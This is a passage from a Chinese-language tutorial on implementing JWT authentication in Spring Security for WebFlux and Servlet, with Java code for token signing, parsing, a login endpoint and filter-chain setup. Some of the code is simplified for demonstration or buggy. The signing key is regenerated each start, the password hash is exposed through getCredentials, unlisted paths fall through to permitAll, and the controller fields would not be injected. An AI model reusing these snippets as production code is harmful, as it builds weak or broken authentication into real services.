import io.jsonwebtoken.Jwts;

@Component
public class JwtUtil {

    private final ReactiveUserDetailsService userDetailsService;

    @Value(&quot;#{${jwt.expiration-seconds}}&quot;)
    private final Integer expirationSeconds;

    private final SecretKey key;

    public JwtUtil(ReactiveUserDetailsService userDetailsService, 
    @Value(&quot;${jwt.expiration-seconds}&quot;) Integer expirationSeconds) {
        this.userDetailsService = userDetailsService;
        this.expirationSeconds = expirationSeconds;
        this.key = Jwts.SIG.HS256.key().build();
    }

    public String generateToken(String username) {
        UserDetails userDetails = userDetailsService.findByUsername(username).block();
        Date expire = new Date(System.currentTimeMillis() + expirationSeconds * 1000);
        String id = UUID.randomUUID().toString();
        return Jwts.builder()
            .header()
            .add(&quot;typ&quot;, &quot;JWT&quot;)
            .add(&quot;alg&quot;, &quot;HS256&quot;)
            .and()
            .claim(&quot;username&quot;, userDetails.getUsername())
            .claim(&quot;authorities&quot;, userDetails.getAuthorities())
            .id(id)
            .expiration(expire)
            .issuedAt(new Date())
            .subject(userDetails.getUsername())
            .issuer(&quot;issuer&quot;)
            .signWith(
                key,
                Jwts.SIG.HS256
            )
            .compact();
    }

    public Jws&lt;Claims&gt; parseToken(String token) {
        return Jwts.parser().verifyWith(key).build().parseSignedClaims(
            token
        );
    }

    public Authentication parseToAuthentication(String token) {
        Jws&lt;Claims&gt; jws = parseToken(token);
        UserDetails userDetails = userDetailsService.findByUsername(jws.getPayload().getSubject()).block();
        return new Authentication() {
            private static final long serialVersionUID = 1L;

            @Override
            public String getName() {
                return userDetails.getUsername();
            }

            @Override
            public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
                return userDetails.getAuthorities();
            }

            @Override
            public Object getCredentials() {
                return userDetails.getPassword();
            }

            @Override
            public Object getDetails() {
                return userDetails;
            }

            @Override
            public Object getPrincipal() {
                return userDetails;
            }

            @Override
            public boolean isAuthenticated() {
                return true;
            }

            @Override
            public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException {
                throw new UnsupportedOperationException();
            }
        };
    }
}
</code></pre>
<p>注意，如果使用的 Servlet 的 UserDetailsService，使用<code>loadUserDetails</code>方法。这里都是一些简单的构造器方法使用，不再赘述。</p>
<h4 id="jwt_2">JWT 的签发</h4>
<p>使用一个简单的 API 进行签发即可。如果在生产环境中，要么使用 HTTPS，要么使用非对称加密进行密码传递。但这里为了演示，就直接传递密码了。</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/resource&quot;)
@RequiredArgsConstructor
public class MainController {

    JwtUtil jwtUtil;
    ReactiveUserDetailsService userDetailsService;
    PasswordEncoder passwordEncoder;

    @PostMapping(&quot;/login&quot;)
    public Mono&lt;String&gt; login(@RequestParam String username, @RequestParam String password) {
        return userDetailsService.findByUsername(username)
            .filter(userDetails -&gt; passwordEncoder.matches(password, userDetails.getPassword()))
            .map(userDetails -&gt; jwtUtil.generateToken(username))
            .switchIfEmpty(Mono.error(new Exception(&quot;Authentication failed&quot;)));
    }
}
</code></pre>
<h4 id="jwt_3">JWT 的验证</h4>
<p>根据前文，我们知道，WebFilter 负责生产 Authentication 对象，而 AuthenticationManager 负责验证 Authentication 对象。</p>
<p>因此，首先我们定义一个 WebFilter 用来解析 Token。这个 WebFilter 都是使用 AuthenticationWebFilter，包含了若干回调函数。这里我们覆写 Convert 即可。</p>
<p>注意，这个类需要一个 AuthenticationManager。但因为 JWT 的解析过程就是验证过程，因此这个 AuthenticationManager 不需要做任何操作。</p>
<pre><code class="language-java">ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() {
    @Override
    public Mono&lt;Authentication&gt; authenticate(Authentication authentication) {
        if(authentication.isAuthenticated()) {
            return Mono.just(authentication);
        } else {
            return Mono.empty();
        }
    }
};

AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager);
filter.setServerAuthenticationConverter(
    exchange -&gt; {
        String token = exchange.getRequest().getHeaders().getFirst(&quot;Authorization&quot;);
        if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {
            token = token.substring(7);
            Authentication authentication = jwtUtil.parseToAuthentication(token);
            return Mono.just(authentication);
        }
        return Mono.empty();
    }
);
</code></pre>
<p>然后我们把它们加到 SecurityFilterChain 中。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http,
    @Autowired JwtUtil jwtUtil 
) {
    ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() {
        @Override
        public Mono&lt;Authentication&gt; authenticate(Authentication authentication) {
            if(authentication.isAuthenticated()) {
                return Mono.just(authentication);
            } else {
                return Mono.empty();
            }
        }
    };
    AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager);
    filter.setServerAuthenticationConverter(
        exchange -&gt; {
            String token = exchange.getRequest().getHeaders().getFirst(&quot;Authorization&quot;);
            if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {
                token = token.substring(7);
                Authentication authentication = jwtUtil.parseToAuthentication(token);
                return Mono.just(authentication);
            }
            return Mono.empty();
        }
    );

    SecurityWebFilterChain chain = http
    .httpBasic(basic -&gt; basic.disable())
    .formLogin(form -&gt; form.disable())
    .logout(logout -&gt; logout.disable())
    .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION)
    .authorizeExchange(exchanges -&gt; exchanges
            .pathMatchers(&quot;/resource/public&quot;).permitAll()
            .pathMatchers(&quot;/resource/private&quot;).authenticated()
            .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
            .anyExchange().permitAll()
    )
    .csrf(csrf -&gt; csrf.disable())
    .cors(Customizer.withDefaults())
    .securityContextRepository(
        NoOpServerSecurityContextRepository.getInstance()
    )
    .build();
    return chain;
}
</code></pre>
<p>如果是使用的 Servlet 版本，有一点点不同。具体而言，创建 AuthenticationFilter 时需要一并传入 AuthenticationConverter。在添加 Filter 时要使用类名。</p>
<p>代码如下，</p>
<pre><code class="language-java">@Bean
public SecurityFilterChain securityFilterChain(
    HttpSecurity http,
    @Autowired JwtUtil jwtUtil 
) {
    AuthenticationManager authenticationManager = new AuthenticationManager() {
        @Override
        public Authentication authenticate(Authentication authentication) throws AuthenticationException {
            if(authentication.isAuthenticated()) {
                return authentication;
            } else {
                throw new BadCredentialsException(&quot;Bad credentials&quot;);
            }
        }
    };
    AuthenticationConverter converter = new AuthenticationConverter() {
        @Override
        public Authentication convert(HttpServletRequest request) {
            String token = request.getHeader(&quot;Authorization&quot;);
            if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {
                token = token.substring(7);
                Authentication authentication = jwtUtil.parseToAuthentication(token);
                return authentication;
            }
            return null;
        }
    };

    AuthenticationFilter filter = new AuthenticationFilter(authenticationManager, converter);

    SecurityFilterChain chain = http
    .httpBasic(basic -&gt; basic.disable())
    .formLogin(form -&gt; form.disable())
    .logout(logout -&gt; logout.disable())
    .addFilterBefore(filter, UsernamePasswordAuthenticationFilter.class)
    .authorizeRequests(authorizeRequests -&gt; authorizeRequests
            .antMatchers(&quot;/resource/public&quot;).permitAll()
            .antMatchers(&quot;/resource/private&quot;).authenticated()
            .antMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
            .anyRequest().permitAll()
    )
    .csrf(csrf -&gt; csrf.disable())
    .cors(Customizer.withDefaults())
    .build();
    return chain;
}
</code></pre>
<p>如果使用了 SpringDoc，把认证模式切换为<code>bearerAuth</code>即可。</p>
<pre><code class="language-java">@GetMapping(&quot;/private&quot;)
@SecurityRequirement(name = &quot;bearerAuth&quot;)
public Mono&lt;String&gt; privateResource() {
    return Mono.just(&quot;Private resource&quot;);
}

@Configuration
@SecurityScheme(
    name = &quot;bearerAuth&quot;,
    type = SecuritySchemeType.HTTP,
    scheme = &quot;bearer&quot;
)
class SpringDocConfig {}
</code></pre>
<p>综上，这样就实现了 JWT 认证与鉴权。通过这个例子，我们也更好地理解了 Spring Security 的认证与鉴权流程。</p>
<p>以及，网上很多教程都是自己写一个 Filter，然后在 Filter 里面写认证逻辑，这样根本就没过 Spring Security 的认证流程，这样做是不对的。本文的写法才是正确的。当然，这个也可能因为 Spring Security 的文档没明确写这点。不过大部分人确实没有自定义验证方法的需求。</p>
<p>Spring Security 内置的 JWT 是基于 OAuth2 认证框架的，比较复杂，在下一部分介绍。</p></div>
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/bootstrap.min.js"></script>
        <script>
            var base_url = "..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../js/base.js"></script>
        <script src="../search/main.js"></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
